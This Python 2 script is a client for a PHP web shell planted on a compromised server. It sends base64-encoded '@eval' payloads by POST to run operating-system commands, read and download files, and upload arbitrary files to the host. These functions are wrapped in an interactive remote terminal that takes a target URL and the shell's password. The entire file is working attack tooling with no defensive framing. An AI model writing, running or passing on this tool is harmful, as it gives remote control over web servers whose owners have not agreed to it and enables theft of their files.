#! /bin/env python  
from requests import Request, Session
import random
import re

class BackendInterface():
    PAT = 'abcdefghijklmnopqrstuvwxy'
    def randParam(self):
        return ''.join(random.sample(self.PAT, 10))
    def __init__(self, reqSess, prepared, key):
        self.s = reqSess
        self.p = prepared
        self.k = key
    def runCmd(self, cmd):
        pass
class PHPBackend(BackendInterface):
    #cmdTemplate = '''$r=system(%s);'''
    cmdTemplate = '''$s=%s;$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c '{$s}'":$s;@system("%s {$c} 2>&1");$r='';'''
    downTemplate = '''$r=file_get_contents(%s);'''
    upTemplate = '''file_put_contents(%s, base64_decode(%s));'''
    glbTemplate = '''$r='';ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo "=>";%s;echo "=%s>".base64_encode($r)."<%s=";die();'''
    def genCode(self, code):
        tok = self.randParam()
        glbs = self.glbTemplate % (code, tok, tok)
        return glbs, tok
    def makePHPStr(self, str):
        t = '\\\r\n\'\"'
        q = "'"
        for i in t:
            str = str.replace(i, '\\'+i)
        return q+str+q
    def runPHPCode(self, code, needDecode=True):
        rp1 = self.randParam()
        code, tok = self.genCode(code)
        self.p.prepare_body(
            {
                self.k: '@eval(base64_decode($_POST[%s]));' % rp1,
                rp1: code.encode('base64')
            }, None)
        rc = self.s.send(self.p, 
            proxies={'http':'http://127.0.0.1:8888'}
        ).content
        ret = False
        if needDecode:
            reStr = '=%s>([\\s\\S]*?)<%s=' % (tok, tok)
        else:
            reStr = '=>([\\s\\S]*?)=%s>' % tok
        r = re.findall(reStr, rc)
        if len(r) == 1:
            ret = r[0]
            if needDecode:
                ret = ret.decode('base64')
        return ret
    def runCmd(self, cmd, osCmd = ''):
        code = self.cmdTemplate % (self.makePHPStr(cmd), osCmd)
        return self.runPHPCode(code, False)
    def download(self, filePath, local):
        code = self.downTemplate % self.makePHPStr(filePath)
        open(local, 'wb').write(self.runPHPCode(code))
    def upload(self, local, filePath):
        content = open(local, 'rb').read().encode('base64').replace('\r','').replace('\n','')
        code = self.upTemplate % (self.makePHPStr(filePath), self.makePHPStr(content))
        self.runPHPCode(code)
class WebShell():
    def __init__(self, url, param):
        self.url = url
        self.s = Session()
        self.p = Request('POST', url).prepare()
        self.backend = PHPBackend(self.s, self.p, param)
    def runCmd(self, cmd):
        return self.backend.runCmd(cmd)
    def download(self, filePath,l):
        return self.backend.download(filePath,l)
    def upload(self, l,f):
        return self.backend.upload(l,f)
def virtualTerminal(ws):
    import sys
    def fltrPath(s):
        return s.replace('\r','').replace('\n','').strip()
    curPath = fltrPath(ws.runCmd('cd'))
    if curPath[0] == '\/':
        pathSplit = '\/'
    else:
        pathSplit = '\\'
    while True:
        sys.stdout.write(curPath + '>')
        cmd = raw_input()
        csp = cmd.split(' ') 
        if cmd == 'exit':
            break
        elif csp[0] == 'upload':
            ws.upload(csp[1], curPath+pathSplit+csp[1])
            print 'Uploading...'
        elif csp[0] == 'download':
            ws.download(curPath+pathSplit+csp[1], csp[1])
            print 'Downloading...'
        else:
            prefix = 'cd /d '+curPath+' & '
            
            ret = w.runCmd(prefix+cmd+' & echo [P] &cd')
            ret = ret.split('[P]')
            if len(ret)>1 and len(fltrPath(ret[-1])) > 0:
                curPath = fltrPath(ret[-1])
            ret = '[P]'.join(ret[:-1])
            print ret
import sys
if len(sys.argv) != 3:
    print 'Usage: %s url, password' % sys.argv[0]
    exit(0)
w = WebShell(sys.argv[1], sys.argv[2])
virtualTerminal(w)
